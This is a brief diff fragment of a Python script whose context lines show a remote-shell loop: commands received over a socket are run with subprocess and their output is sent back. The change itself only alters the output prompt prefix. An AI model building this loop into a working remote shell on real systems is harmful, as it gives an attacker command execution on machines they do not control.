@@ -14,4 +14,4 @@ while True:
 	respcom = subprocess.getoutput(dat)
 	if b"exit" in dat:
 		break
-	s.sendall(("=> " + respcom + "\n#: ").encode())
+	s.sendall(("> " + respcom + "\n#: ").encode())
